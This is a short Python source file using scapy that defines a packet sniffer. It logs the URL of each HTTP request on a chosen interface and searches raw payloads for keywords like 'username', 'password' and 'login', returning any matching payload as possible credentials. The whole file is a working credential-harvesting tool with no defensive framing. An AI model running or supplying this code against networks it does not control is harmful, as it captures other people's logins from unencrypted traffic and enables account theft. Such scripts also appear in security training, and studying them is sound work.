import scapy.all as scapy
from scapy.layers import http

class Sniffer:
    def __init__(self,interface):
        self.interface = interface
        self.keywords = (
            "username", 'Username','Uname','uname','password','Password'
            ,'Pass','pass','login','Login','Log in','log in','Log in','log in'
            ,'sign','Sign','sign in','Sign in','sign out','Sign out','SignOut','signout'
            ,'Signout','SignOut','logout','Logout')

    def proccess_packet(self, packet, callback):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet=packet)
            callback(f"HTTP Url is: {url}")
            creds = self.get_credentials(packet)
            if creds:
                callback(f"possible credentials: {creds}")

    def get_url(self, packet):
        host = packet[http.HTTPRequest].Host.decode()
        path = packet[http.HTTPRequest].Path.decode()
        return f"http://{host}{path}"

    def get_credentials(self, packet): 
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode('utf-8')
            for keyword in self.keywords:
                if keyword in load:
                    return load
        return None

    def sniff(self, stop_event, callback):
        scapy.sniff(iface=self.interface, store=False, prn=lambda packet: self.proccess_packet(packet, callback), stop_filter=lambda p: stop_event.is_set())

# sniff("Wi-Fi")